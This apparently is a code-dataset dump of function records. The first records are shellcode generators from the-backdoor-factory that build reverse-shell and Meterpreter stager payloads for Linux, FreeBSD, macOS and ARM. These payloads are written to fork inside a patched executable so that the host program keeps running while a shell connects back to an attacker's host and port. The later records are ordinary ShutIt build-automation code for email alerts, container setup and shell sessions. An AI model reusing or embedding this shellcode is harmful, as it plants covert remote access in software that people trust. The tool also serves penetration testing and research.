(\"\\xB8\\x02\\x00\\x00\\x02\\xcd\\x80\\x85\\xd2\")\nself.shellcode1 += \"\\x0f\\x84\"\nif self.jumpLocation < 0:\n    self.shellcode1 += struct.pack(\"<I\", len(self.shellcode1) + 0xffffffff + self.jumpLocation)\nelse:\n    self.shellcode1 += struct.pack(\"<I\", len(self.shellcode2) + self.jumpLocation)\n\nself.shellcode = self.shellcode1 + self.shellcode2\nreturn (self.shellcode1 + self.shellcode2)", "path": "the-backdoor-factory/intel/MachoIntel32.py", "commit_date": "2017-01-11 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "\"\"\"\nFOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER\nModified metasploit payload/linux/x64/shell/reverse_tcp\nto correctly fork the shellcode payload and contiue normal execution.\n\"\"\"\n", "func_signal": "def reverse_tcp_stager(self, CavesPicked={}):\n", "code": "if self.PORT is None:\n    print (\"Must provide port\")\n    return False\n\nself.shellcode1 = \"\\x6a\\x02\\x58\\xcd\\x80\\x85\\xc0\\x74\\x07\"\n#will need to put resume execution shellcode here\nself.shellcode1 += \"\\xbd\"\nself.shellcode1 += struct.pack(\"<I\", self.e_entry)\nself.shellcode1 += \"\\xff\\xe5\"\nself.shellcode1 += (\"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\xb0\\x66\\x89\\xe1\\xcd\\x80\"\n                    \"\\x97\\x5b\\x68\")\n#HOST\nself.shellcode1 += self.pack_ip_addresses()\nself.shellcode1 += \"\\x68\\x02\\x00\"\n#PORT\nself.shellcode1 += struct.pack('!H', self.PORT)\nself.shellcode1 += (\"\\x89\\xe1\\x6a\"\n                    \"\\x66\\x58\\x50\\x51\\x57\\x89\\xe1\\x43\\xcd\\x80\\xb2\\x07\\xb9\\x00\\x10\"\n                    \"\\x00\\x00\\x89\\xe3\\xc1\\xeb\\x0c\\xc1\\xe3\\x0c\\xb0\\x7d\\xcd\\x80\\x5b\"\n                    \"\\x89\\xe1\\x99\\xb6\\x0c\\xb0\\x03\\xcd\\x80\\xff\\xe1\")\n\nself.shellcode = self.shellcode1\nreturn (self.shellcode1)", "path": "the-backdoor-factory/intel/LinuxIntelELF32.py", "commit_date": "2017-01-11 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "# call your program main here\n", "func_signal": "def run(self):\n", "code": "self.hello()\n\n# return a result here, if you want\nreturn self.result", "path": "the-backdoor-factory/preprocessor/template.py", "commit_date": "2016-06-20 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "\"\"\"\nModified from metasploit payload/linux/x86/shell_reverse_tcp\nto correctly fork the shellcode payload and contiue normal execution.\n\"\"\"\n", "func_signal": "def reverse_shell_tcp(self, CavesPicked={}):\n", "code": "if self.PORT is None:\n    print (\"Must provide port\")\n    return False\n\nself.shellcode1 = \"\\x6a\\x02\\x58\\xcd\\x80\\x85\\xc0\\x74\\x07\"\n#will need to put resume execution shellcode here\nself.shellcode1 += \"\\xbd\"\nself.shellcode1 += struct.pack(\"<I\", self.e_entry)\nself.shellcode1 += \"\\xff\\xe5\"\nself.shellcode1 += (\"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\"\n                    \"\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\")\n#HOST\nself.shellcode1 += self.pack_ip_addresses()\nself.shellcode1 += \"\\x68\\x02\\x00\"\n#PORT\nself.shellcode1 += struct.pack('!H', self.PORT)\nself.shellcode1 += (\"\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\"\n                    \"\\xcd\\x80\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\"\n                    \"\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\")\n\nself.shellcode = self.shellcode1\nreturn (self.shellcode1)", "path": "the-backdoor-factory/intel/LinuxIntelELF32.py", "commit_date": "2017-01-11 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "\"\"\"\nModified metasploit payload/bsd/x86/shell_reverse_tcp\nto correctly fork the shellcode payload and contiue normal execution.\n\"\"\"\n", "func_signal": "def reverse_shell_tcp(self, CavesPicked={}):\n", "code": "if self.PORT is None:\n    print (\"Must provide port\")\n    return False\n\nself.shellcode1 = \"\\x52\"        # push edx\nself.shellcode1 += \"\\x31\\xC0\"   # xor eax, eax\nself.shellcode1 += \"\\xB0\\x02\"   # mov al, 2\nself.shellcode1 += \"\\xCD\\x80\"   # int 80\nself.shellcode1 += \"\\x5A\"       # pop edx\nself.shellcode1 += \"\\x85\\xc0\\x74\\x07\"\nself.shellcode1 += \"\\xbd\"\n#JMP to e_entry\nself.shellcode1 += struct.pack(\"<I\", self.e_entry)\nself.shellcode1 += \"\\xff\\xe5\"\n#BEGIN EXTERNAL SHELLCODE\nself.shellcode1 += \"\\x68\"\nself.shellcode1 += self.pack_ip_addresses()\nself.shellcode1 += \"\\x68\\xff\\x02\"\nself.shellcode1 += struct.pack('!H', self.PORT)\nself.shellcode1 += (\"\\x89\\xe7\\x31\\xc0\\x50\"\n                    \"\\x6a\\x01\\x6a\\x02\\x6a\\x10\\xb0\\x61\\xcd\\x80\\x57\\x50\\x50\\x6a\\x62\"\n                    \"\\x58\\xcd\\x80\\x50\\x6a\\x5a\\x58\\xcd\\x80\\xff\\x4f\\xe8\\x79\\xf6\\x68\"\n                    \"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x54\\x53\\x50\"\n                    \"\\xb0\\x3b\\xcd\\x80\")\nself.shellcode = self.shellcode1\nreturn (self.shellcode1)", "path": "the-backdoor-factory/intel/FreeBSDIntelELF32.py", "commit_date": "2017-01-11 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "\"\"\"\nModified from metasploit payload/linux/armle/shell_reverse_tcp\nto correctly fork the shellcode payload and contiue normal execution.\n\"\"\"\n", "func_signal": "def reverse_shell_tcp(self, CavesPicked={}):\n", "code": "if self.PORT is None:\n    print (\"Must provide port\")\n    sys.exit(1)\n#FORKING\nself.shellcode1 = \"\\x00\\x40\\xa0\\xe1\"   # mov r4, r0 \nself.shellcode1 += \"\\x00\\x00\\x40\\xe0\"   # sub r0, r0, r0\nself.shellcode1 += \"\\x02\\x70\\xa0\\xe3\"   # mov r7, #2\nself.shellcode1 += \"\\x00\\x00\\x00\\xef\"   # scv 0\nself.shellcode1 += \"\\x00\\x00\\x50\\xe3\"   # cmp r0, #\nself.shellcode1 += \"\\x04\\x00\\xa0\\xe1\"   # mov r0, r4\nself.shellcode1 += \"\\x04\\x40\\x44\\xe0\"   # sub r4, r4, r4\nself.shellcode1 += \"\\x00\\x70\\xa0\\xe3\"   # mov r7, #0\nself.shellcode1 += \"\\x00\\x00\\x00\\x0a\"   # beq to shellcode\n# JMP Address = (entrypoint - currentaddress -8)/4\njmpAddr = 0xffffff + (self.e_entry -(self.shellcode_vaddr +len(self.shellcode1)) - 4)/4\nself.shellcode1 += (struct.pack(\"<I\", jmpAddr)).strip(\"\\x00\")\nself.shellcode1 += \"\\xea\"   #b entrypoint\n\n#ACTUAL SHELLCODE\nself.shellcode1 += (\"\\x02\\x00\\xa0\\xe3\\x01\\x10\\xa0\\xe3\\x05\\x20\\x81\\xe2\\x8c\\x70\\xa0\"\n                    \"\\xe3\\x8d\\x70\\x87\\xe2\\x00\\x00\\x00\\xef\\x00\\x60\\xa0\\xe1\\x84\\x10\"\n                    \"\\x8f\\xe2\\x10\\x20\\xa0\\xe3\\x8d\\x70\\xa0\\xe3\\x8e\\x70\\x87\\xe2\\x00\"\n                    \"\\x00\\x00\\xef\\x06\\x00\\xa0\\xe1\\x00\\x10\\xa0\\xe3\\x3f\\x70\\xa0\\xe3\"\n                    \"\\x00\\x00\\x00\\xef\\x06\\x00\\xa0\\xe1\\x01\\x10\\xa0\\xe3\\x3f\\x70\\xa0\"\n                    \"\\xe3\\x00\\x00\\x00\\xef\\x06\\x00\\xa0\\xe1\\x02\\x10\\xa0\\xe3\\x3f\\x70\"\n                    \"\\xa0\\xe3\\x00\\x00\\x00\\xef\\x48\\x00\\x8f\\xe2\\x04\\x40\\x24\\xe0\\x10\"\n                    \"\\x00\\x2d\\xe9\\x0d\\x20\\xa0\\xe1\\x04\\x00\\x2d\\xe9\\x0d\\x20\\xa0\\xe1\"\n                    \"\\x10\\x00\\x2d\\xe9\\x48\\x10\\x9f\\xe5\\x02\\x00\\x2d\\xe9\\x00\\x20\\x2d\"\n                    \"\\xe9\\x0d\\x10\\xa0\\xe1\\x04\\x00\\x2d\\xe9\\x0d\\x20\\xa0\\xe1\\x0b\\x70\"\n                    \"\\xa0\\xe3\\x00\\x00\\x00\\xef\"\n                    \"\\x00\\x00\\xa0\\xe3\\x01\\x70\\xa0\\xe3\\x00\\x00\\x00\\xef\" #exit\n                    \"\\x02\\x00\")\n\nself.shellcode1 += struct.pack('!H', self.PORT)\nself.shellcode1 += self.pack_ip_addresses()\nself.shellcode1 += (\"\\x2f\\x62\\x69\\x6e\"\n                    \"\\x2f\\x73\\x68\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x2d\\x43\\x00\"\n                    \"\\x00\")\n#exit test\n#self.shellcode1 += \"\\x00\\x00\\xa0\\xe3\\x01\\x70\\xa0\\xe3\\x00\\x00\\x00\\xef\"\nself.shellcode = self.shellcode1\nreturn (self.shellcode1)", "path": "the-backdoor-factory/arm/LinuxARMLELF32.py", "commit_date": "2014-07-31 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "\"\"\"\nFOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER\nModified from metasploit payload/bsd/x86/shell/reverse_tcp\nto correctly fork the shellcode payload and continue normal execution.\n\"\"\"\n", "func_signal": "def reverse_tcp_stager(self, CavesPicked={}):\n", "code": "if self.PORT is None:\n    print (\"Must provide port\")\n    return False\n#FORK SHELLCODE\nself.shellcode1 = \"\\x52\"        # push edx\nself.shellcode1 += \"\\x31\\xC0\"   # xor eax, eax\nself.shellcode1 += \"\\xB0\\x02\"   # mov al, 2\nself.shellcode1 += \"\\xCD\\x80\"   # int 80\nself.shellcode1 += \"\\x5A\"       # pop edx\nself.shellcode1 += \"\\x85\\xc0\\x74\\x07\"\nself.shellcode1 += \"\\xbd\"\nself.shellcode1 += struct.pack(\"<I\", self.e_entry)\nself.shellcode1 += \"\\xff\\xe5\"\n#EXTERNAL SHELLCODE\nself.shellcode1 += \"\\x6a\\x61\\x58\\x99\\x52\\x42\\x52\\x42\\x52\\x68\"\nself.shellcode1 += self.pack_ip_addresses()\nself.shellcode1 += \"\\xcd\\x80\\x68\\x10\\x02\"\nself.shellcode1 += struct.pack('!H', self.PORT)\nself.shellcode1 += (\"\\x89\\xe1\\x6a\\x10\\x51\\x50\\x51\\x97\\x6a\\x62\\x58\\xcd\\x80\"\n                    \"\\xb0\\x03\\xc6\\x41\\xfd\\x10\\xcd\\x80\\xc3\")\nself.shellcode = self.shellcode1\nreturn (self.shellcode1)", "path": "the-backdoor-factory/intel/FreeBSDIntelELF32.py", "commit_date": "2017-01-11 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "# REQUIRED\n", "func_signal": "def __init__(self, BDF):\n", "code": "        self.BDF = BDF\n        # if you want to return a result set it to True\n        #  and check for failures\n        self.result = True", "path": "the-backdoor-factory/preprocessor/template.py", "commit_date": "2016-06-20 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "# REQUIRED\n", "func_signal": "def __init__(self, BDF):\n", "code": "        self.BDF = BDF\n\n        # Other \n        self.nsis_binary = False", "path": "the-backdoor-factory/preprocessor/nsis_3_0.py", "commit_date": "2016-06-20 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "# call your program main here, we're calling print_debug()\n", "func_signal": "def run(self):\n", "code": "self.print_debug()\n\nreturn self.result", "path": "the-backdoor-factory/preprocessor/debug.py", "commit_date": "2016-06-19 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "#Modified from metasploit\n", "func_signal": "def delay_reverse_shell_tcp(self):\n", "code": "if self.PORT is None:\n    print (\"Must provide port\")\n    return False\nif self.HOST is None:\n    print (\"This payload requires a HOST parameter -H\")\n    return False\n\nself.shellcode2 = \"\\xB8\\x74\\x00\\x00\\x02\\xcd\\x80\"   # put system time in eax\nself.shellcode2 += \"\\x05\"                           # add eax, 15  for seconds\nself.shellcode2 += struct.pack(\"<I\", self.BEACON)\nself.shellcode2 += (\"\\x89\\xC3\"                      # mov ebx, eax\n                    \"\\xB8\\x74\\x00\\x00\\x02\\xcd\\x80\"  # put system time in eax\n                    \"\\x39\\xD8\"                      # cmp eax, ebx\n                    \"\\x0F\\x85\\xf1\\xff\\xff\\xff\"      # jne back to system time\n                    )\nself.shellcode2 += \"\\x68\"\nself.shellcode2 += self.pack_ip_addresses()\nself.shellcode2 += \"\\x68\\xff\\x02\"\nself.shellcode2 += struct.pack(\">H\", self.PORT)\nself.shellcode2 += (\"\\x89\\xe7\\x31\\xc0\\x50\"\n                    \"\\x6a\\x01\\x6a\\x02\\x6a\\x10\\xb0\\x61\\xcd\\x80\\x57\\x50\\x50\\x6a\\x62\"\n                    \"\\x58\\xcd\\x80\\x50\\x6a\\x5a\\x58\\xcd\\x80\\xff\\x4f\\xe8\\x79\\xf6\\x68\"\n                    \"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x54\\x54\\x53\"\n                    \"\\x50\\xb0\\x3b\\xcd\\x80\"\n                    )\n\nself.shellcode1 = (\"\\xB8\\x02\\x00\\x00\\x02\\xcd\\x80\\x85\\xd2\")\nself.shellcode1 += \"\\x0f\\x84\"\nif self.jumpLocation < 0:\n    self.shellcode1 += struct.pack(\"<I\", len(self.shellcode1) + 0xffffffff + self.jumpLocation)\nelse:\n    self.shellcode1 += struct.pack(\"<I\", len(self.shellcode2) + self.jumpLocation)\n\nself.shellcode = self.shellcode1 + self.shellcode2\nreturn (self.shellcode1 + self.shellcode2)", "path": "the-backdoor-factory/intel/MachoIntel32.py", "commit_date": "2017-01-11 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "#could take this out HOST/PORT and put into each shellcode function\n", "func_signal": "def __init__(self, HOST, PORT, e_entry, SUPPLIED_SHELLCODE=None):\n", "code": "self.HOST = HOST\nself.PORT = PORT\nself.e_entry = e_entry\nself.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE\nself.shellcode = \"\"", "path": "the-backdoor-factory/intel/LinuxIntelELF32.py", "commit_date": "2017-01-11 00:00:00", "repo_name": "secretsquirrel/the-backdoor-factory", "stars": 3236, "license": "bsd-3-clause", "language": "python", "size": 2741}
{"docstring": "\"\"\"Attach a file - currently needs to be entered as root (shutit)\n\nFilename - absolute path, relative to the target host!\nfiletype - MIMEApplication._subtype\n\"\"\"\n", "func_signal": "def attach(self, filename, filetype=\"txt\"):\n", "code": "shutit = self.shutit\nhost_path = '/tmp'\nhost_fn = shutit.get_file(filename, host_path)\nif self.config['shutit.core.alerting.emailer.compress']:\n\tfiletype = 'x-gzip-compressed'\n\tfilename = self.__gzip(host_fn)\n\thost_fn = os.path.join(host_path, os.path.basename(filename))\nfile_pointer = open(host_fn, 'rb')\nattach = MIMEApplication(file_pointer.read(), _subtype=filetype)\nfile_pointer.close()\nattach.add_header('Content-Disposition', 'attachment', filename=os.path.basename(filename))\nself.attaches.append(attach)", "path": "shutit/emailer.py", "commit_date": "2018-12-20 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"Sets up the machine ready for building.\n\"\"\"\n", "func_signal": "def build(self, shutit):\n", "code": "shutit_pexpect_session = ShutItPexpectSession(shutit, 'target_child','/bin/bash')\ntarget_child = shutit_pexpect_session.pexpect_child\nshutit_pexpect_session.expect(shutit_global.shutit_global_object.base_prompt.strip(), timeout=10)\nself.setup_host_child(shutit)\nself.setup_target_child(shutit, target_child)\nreturn True", "path": "shutit/shutit_setup.py", "commit_date": "2018-12-20 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"Set up the signal handlers.\n\"\"\"\n", "func_signal": "def setup_signals():\n", "code": "signal.signal(signal.SIGINT, shutit_util.ctrl_c_signal_handler)\nsignal.signal(signal.SIGQUIT, shutit_util.ctrl_quit_signal_handler)", "path": "shutit/shutit_global.py", "commit_date": "2020-01-09 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"Finalizes the target, exiting for us back to the original shell\nand performing any repository work required.\n\"\"\"\n# Finish with the target\n", "func_signal": "def finalize(self, shutit):\n", "code": "target_child_pexpect_session = shutit.get_shutit_pexpect_session_from_id('target_child')\nassert not target_child_pexpect_session.sendline(ShutItSendSpec(target_child_pexpect_session,'exit',ignore_background=True)), shutit_util.print_debug()\nhost_child_pexpect_session = shutit.get_shutit_pexpect_session_from_id('host_child')\nhost_child = host_child_pexpect_session.pexpect_child\nshutit.set_default_shutit_pexpect_session(host_child_pexpect_session)\nshutit.set_default_shutit_pexpect_session_expect(shutit.expect_prompts['ORIGIN_ENV'])\nshutit.do_repository_work(shutit.repository['name'], docker_executable=shutit.host['docker_executable'], password=shutit.host['password'])\n# Final exits\nhost_child.sendline('rm -f ' + shutit.build['cidfile']) # Ignore response, just send.\nhost_child.sendline('exit') # Exit raw bash. Ignore response, just send.\nreturn True", "path": "shutit/shutit_setup.py", "commit_date": "2018-12-20 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"Initializes target ready for build and updating package management if in container.\n\"\"\"\n", "func_signal": "def build(self, shutit):\n", "code": "if shutit.build['delivery'] in ('docker','dockerfile'):\n\tif shutit.get_current_shutit_pexpect_session_environment().install_type == 'apt':\n\t\tshutit.add_to_bashrc('export DEBIAN_FRONTEND=noninteractive')\n\t\tif not shutit.command_available('lsb_release'):\n\t\t\tshutit.install('lsb-release')\n\t\tshutit.lsb_release()\n\telif shutit.get_current_shutit_pexpect_session_environment().install_type == 'yum':\n\t\t# yum updates are so often \"bad\" that we let exit codes of 1 through.\n\t\t# TODO: make this more sophisticated\n\t\tshutit.send('yum update -y', timeout=9999, exit_values=['0', '1'])\n\tshutit.pause_point('Anything you want to do to the target host ' + 'before the build starts?', level=2)\nreturn True", "path": "shutit/shutit_setup.py", "commit_date": "2018-12-20 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"Determine whether we're in an interactive shell.\nSets interactivity off if appropriate.\ncf http://stackoverflow.com/questions/24861351/how-to-detect-if-python-script-is-being-run-as-a-background-process\n\"\"\"\n", "func_signal": "def determine_interactive(self):\n", "code": "try:\n\tif not sys.stdout.isatty() or os.getpgrp() != os.tcgetpgrp(sys.stdout.fileno()):\n\t\tself.interactive = 0\n\t\treturn False\nexcept Exception:\n\tself.interactive = 0\n\treturn False\nif self.interactive == 0:\n\treturn False\nreturn True", "path": "shutit/shutit_global.py", "commit_date": "2020-01-09 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"Handles simple printing of a msg at the global level.\n\"\"\"\n", "func_signal": "def shutit_print(self, msg):\n", "code": "if self.pane_manager is None:\n\tprint(msg)", "path": "shutit/shutit_global.py", "commit_date": "2020-01-09 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"Finalizes the target, exiting for us back to the original shell\nand performing any repository work required.\n\"\"\"\n# Finish with the target\n", "func_signal": "def finalize(self, shutit):\n", "code": "target_child_pexpect_session = shutit.get_shutit_pexpect_session_from_id('target_child')\nassert not target_child_pexpect_session.sendline(ShutItSendSpec(target_child_pexpect_session,'exit',ignore_background=True)), shutit_util.print_debug()\nreturn True", "path": "shutit/shutit_setup.py", "commit_date": "2018-12-20 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\" Return the appropraite smtplib depending on wherther we're using TLS\n\"\"\"\n", "func_signal": "def __get_smtp(self):\n", "code": "use_tls = self.config['shutit.core.alerting.emailer.use_tls']\nif use_tls:\n\tsmtp = SMTP(self.config['shutit.core.alerting.emailer.smtp_server'], self.config['shutit.core.alerting.emailer.smtp_port'])\n\tsmtp.starttls()\nelse:\n\tsmtp = SMTP_SSL(self.config['shutit.core.alerting.emailer.smtp_server'], self.config['shutit.core.alerting.emailer.smtp_port'])\nreturn smtp", "path": "shutit/emailer.py", "commit_date": "2018-12-20 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"Returns all the shutit_pexpect sessions in existence.\n\"\"\"\n", "func_signal": "def get_shutit_pexpect_sessions():\n", "code": "sessions = []\nfor shutit_object in shutit_global_object.shutit_objects:\n\tfor key in shutit_object.shutit_pexpect_sessions:\n\t\tsessions.append(shutit_object.shutit_pexpect_sessions[key])\nreturn sessions", "path": "shutit/shutit_global.py", "commit_date": "2020-01-09 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "# reset object\n", "func_signal": "def run_background_command(self):\n", "code": "self.pid              = None\nself.return_value     = None\nself.run_state        = 'N'\nself.start_time = time.time() # record start time\n\n# run command\nself.tries            += 1\nif self.sendspec.run_in_background:\n\t## Required to reset terminal before a background send. (TODO: why?)\n\t#self.sendspec.shutit_pexpect_child.reset_terminal()\n\t# Run in the background\n\tself.sendspec.shutit_pexpect_child.quick_send(self.sendspec.send,loglevel=logging.DEBUG)\n\t# Put into an 'S' state as that means 'running'\n\tself.run_state        = 'S'\n\t# Required to reset terminal after a background send. (TODO: why?)\n\tself.sendspec.shutit_pexpect_child.reset_terminal()\n\t# record pid\n\tself.pid = self.sendspec.shutit_pexpect_child.send_and_get_output(\" echo ${!}\",ignore_background=True)\nelse:\n\t# Run synchronously and mark complete\n\t# We need to set this to ignore background before we run it, so that\n\t# it does not block itself and end up in an infinite loop.\n\tself.sendspec.ignore_background = True\n\tself.sendspec.shutit_pexpect_child.send(self.sendspec)\n\tself.run_state = 'C'\n\nself.sendspec.started = True\n\nassert self.run_state in ('C','S','F'), shutit_util.print_debug()\nreturn True", "path": "shutit/shutit_background.py", "commit_date": "2018-12-20 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"\n\nonly_one             - singleton insurance\n\"\"\"\n", "func_signal": "def __init__(self, shutit_global_object):\n", "code": "assert self.only_one is None\nself.only_one is True\n# Keep it simple for now by creating four panes\nself.shutit_global             = shutit_global_object\nself.top_left_session_pane     = SessionPane('top_left')\nself.top_right_session_pane    = SessionPane('top_right')\nself.bottom_left_session_pane  = SessionPane('bottom_left')\nself.bottom_right_session_pane = SessionPane('bottom_right')\nself.window                    = None\nself.screen_arr                = None\nself.wheight                   = None\nself.wwidth                    = None\n# Whether to actually draw the screen - defaults to 'True'\nself.do_render                 = True\n# Refresh the window\nself.refresh_window()", "path": "shutit/shutit_global.py", "commit_date": "2020-01-09 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"Set a local config array up according to\ndefaults and main shutit configuration\n\ncfg_section - see __init__\n\"\"\"\n", "func_signal": "def __set_config(self, cfg_section):\n", "code": "defaults = [\n\t'shutit.core.alerting.emailer.mailto', None,\n\t'shutit.core.alerting.emailer.mailfrom', 'angry@shutit.tk',\n\t'shutit.core.alerting.emailer.smtp_server', 'localhost',\n\t'shutit.core.alerting.emailer.smtp_port', 25,\n\t'shutit.core.alerting.emailer.use_tls', True,\n\t'shutit.core.alerting.emailer.send_mail', True,\n\t'shutit.core.alerting.emailer.subject', 'Shutit Report',\n\t'shutit.core.alerting.emailer.signature', '--Angry Shutit',\n\t'shutit.core.alerting.emailer.compress', True,\n\t'shutit.core.alerting.emailer.username', '',\n\t'shutit.core.alerting.emailer.password', '',\n\t'shutit.core.alerting.emailer.safe_mode', True,\n\t'shutit.core.alerting.emailer.maintainer','',\n\t'shutit.core.alerting.emailer.mailto_maintainer', True\n]\n\nfor cfg_name, cfg_default in zip(defaults[0::2], defaults[1::2]):\n\ttry:\n\t\tself.config[cfg_name] = self.shutit.cfg[cfg_section][cfg_name]\n\texcept KeyError:\n\t\tif cfg_default is None:\n\t\t\traise Exception(cfg_section + ' ' + cfg_name + ' must be set')\n\t\telse:\n\t\t\tself.config[cfg_name] = cfg_default\n\n# only send a mail to the module's maintainer if configured correctly\nif self.config['shutit.core.alerting.emailer.mailto_maintainer'] and \\\n\t(self.config['shutit.core.alerting.emailer.maintainer'] == \"\" or \\\n\tself.config['shutit.core.alerting.emailer.maintainer'] == self.config['shutit.core.alerting.emailer.mailto']):\n\tself.config['shutit.core.alerting.emailer.mailto_maintainer'] = False\n\tself.config['shutit.core.alerting.emailer.maintainer'] = \"\"", "path": "shutit/emailer.py", "commit_date": "2018-12-20 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"Sets up the target ready for building.\n\"\"\"\n", "func_signal": "def build(self, shutit):\n", "code": "target_child = self.start_container(shutit, 'target_child')\nself.setup_host_child(shutit)\n# TODO: on the host child, check that the image running has bash as its cmd/entrypoint.\nself.setup_target_child(shutit, target_child)\nshutit.send('chmod -R 777 ' + shutit_global.shutit_global_object.shutit_state_dir + ' && mkdir -p ' + shutit_global.shutit_global_object.shutit_state_dir_build_db_dir + '/' + shutit_global.shutit_global_object.build_id, shutit_pexpect_child=target_child, echo=False)\nreturn True", "path": "shutit/shutit_setup.py", "commit_date": "2018-12-20 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "# Only one window - the top left.\n", "func_signal": "def do_layout_zoomed(self, zoom_number):\n", "code": "self.top_left_session_pane.set_position    (top_left_x=0,\n                                            top_left_y=1,\n                                            bottom_right_x=self.wwidth,\n                                            bottom_right_y=self.wheight-1)", "path": "shutit/shutit_global.py", "commit_date": "2020-01-09 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"Connects ShutIt to something\n\"\"\"\n", "func_signal": "def conn_module():\n", "code": "return [\n\tConnDocker('shutit.tk.conn_docker', -0.1, description='Connect ShutIt to docker'),\n\tConnBash  ('shutit.tk.conn_bash',   -0.1, description='Connect ShutIt to a host via bash'),\n]", "path": "shutit/shutit_setup.py", "commit_date": "2018-12-20 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\" Compress a file returning the new filename (.gz)\n\"\"\"\n", "func_signal": "def __gzip(filename):\n", "code": "zipname = filename + '.gz'\nfile_pointer = open(filename,'rb')\nzip_pointer = gzip.open(zipname,'wb')\nzip_pointer.writelines(file_pointer)\nfile_pointer.close()\nzip_pointer.close()\nreturn zipname", "path": "shutit/emailer.py", "commit_date": "2018-12-20 00:00:00", "repo_name": "ianmiell/shutit", "stars": 2145, "license": "mit", "language": "python", "size": 15648}
{"docstring": "\"\"\"Initialise the emailer object\ncfg_section - section in shutit config to look for email configuration items, allowing easier config according to shutit_module.\ne.g. 'com.my_module','shutit.core.alerting.emailer.subject': My Module Build Failed!\nConfig Items:\nshutit.core.alerting.emailer.mailto      - address to send the mail to (no default)\nshutit.core.alerting.emailer.mailfrom    - address to send the mail from (angry@shutit.tk)\nshutit.core.alerting.emailer.smtp_server - server to send the mail (localhost)\nshutit.core.alerting.emailer.smtp_port   - port to contact the smtp server on (587)\nshutit.core.alerting.emailer.use_tls     - should we use tls to connect (True)\nshutit.core.alerting.emailer.subject     - subject of the email (Shutit Report)\nshutit.core.alerting.emailer.signature   - --Angry Shutit\nshutit.core.alerting.emailer.compress    - gzip attachments? (True)\nshutit.core.alerting.emailer.username    - mail username\nshutit.core.alerting.emailer.password    - mail password\nshutit.core.alerting.emailer.safe_mode   - don't fail the build if we get an exception\nshutit.core.alerting.emailer.mailto_maintainer - email the maintainer of the module as well as the shutit.core.alerting.emailer.mailto address\n\"\"\"\n", "func_signal": "def __init__( self, cfg_section, shutit):\n", "code": "self.shutit    = shutit\nself.config    = {}\nself.__set_config(cfg_section)\nself.lines     = 